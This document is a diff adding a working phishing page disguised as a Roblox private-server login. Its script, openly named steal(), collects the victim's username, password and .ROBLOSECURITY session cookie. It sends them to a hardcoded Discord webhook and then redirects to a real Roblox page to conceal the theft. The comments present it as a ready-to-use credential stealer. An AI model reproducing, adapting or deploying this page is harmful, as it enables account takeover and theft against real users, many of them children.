@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Roblox Private Server</title>
+<style>
+body { background: #1a1a2e; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.box { background: #16213e; padding: 40px; border-radius: 10px; text-align: center; width: 350px; }
+.logo { font-size: 32px; color: #fff; font-weight: bold; }
+.logo span { color: #00bfff; }
+input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #0f3460; color: #fff; }
+button { width: 100%; padding: 12px; background: #00bfff; border: none; border-radius: 5px; color: #fff; font-weight: bold; cursor: pointer; }
+button:hover { background: #0099cc; }
+</style>
+</head>
+<body>
+<div class="box">
+<div class="logo">Roblox <span>Private</span></div>
+<p style="color:#aaa;">Enter to join private server</p>
+<input type="text" id="username" placeholder="Roblox Username">
+<input type="password" id="password" placeholder="Roblox Password">
+<button onclick="steal()">Join Server</button>
+</div>
+<script>
+function steal() {
+    const u = document.getElementById('username').value;
+    const p = document.getElementById('password').value;
+    // Steal .ROBLOSECURITY cookie
+    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || '';
+    const data = { username: u, password: p, roblosecurity: cookie };
+    // Send to your Discord webhook
+    fetch('https://discord.com/api/webhooks/1515763157937815644/iBPg1dvthWvVx-TETFB_nbQtSzTQNjcw7jBg9xFJ9hgLFBUY_6klZqGOpFP8_FvSuuUX', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: '```' + JSON.stringify(data, null, 2) + '```' })
+    });
+    // Redirect to real Roblox private server
+    window.location.href = 'https://www.roblox.com/games/123456789/Private-Server';
+}
+</script>
+</body>
+</html>
